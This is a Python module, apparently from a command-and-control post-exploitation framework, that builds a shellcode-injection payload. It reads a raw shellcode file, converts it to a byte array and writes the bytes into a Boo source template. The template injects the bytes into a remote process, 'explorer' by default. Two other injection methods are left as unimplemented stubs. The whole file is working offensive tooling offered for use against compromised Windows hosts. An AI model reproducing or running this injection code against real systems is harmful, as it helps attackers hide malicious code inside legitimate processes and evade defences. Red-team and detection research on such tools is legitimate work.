import os
from core.utils import print_bad, to_byte_array


class STModule:
    def __init__(self):
        self.name = 'boo/shellcode'
        self.language = 'boo'
        self.description = 'Injects shellcode using the specified technique'
        self.author = '@byt3bl33d3r'
        self.options = {
            'Shellcode': {
                'Description'   :   'Path to shellcode',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Process': {
                'Description'   :   'Process to inject into',
                'Required'      :   False,
                'Value'         :   'explorer'
            },
            'InjectionMethod': {
                'Description'   :   'Injection Method',
                'Required'      :   False,
                'Value'         :   'InjectRemote'
            }
        }

    def payload(self):
        shellcode_path = os.path.expanduser(self.options['Shellcode']['Value'])
        if os.path.exists(shellcode_path):
            with open(shellcode_path, 'rb') as shellcode:

                if self.options['InjectionMethod']['Value'] == 'InjectRemote':
                    with open('modules/boo/src/injectremote.boo', 'r') as module_src:
                        shellcode = ','.join(list(map(str, to_byte_array(shellcode.read()))))

                        src = module_src.read()
                        src = src.replace('BYTES', shellcode)
                        src = src.replace('PROCESS', self.options['Process']['Value'])
                        return src

                elif self.options['InjectionMethod']['Value'] == 'QueueUserAPC':
                    raise NotImplemented

                elif self.options['InjectionMethod']['Value'] == 'InjectSelf':
                    raise NotImplemented

        print_bad("Path to shellcode invalid")
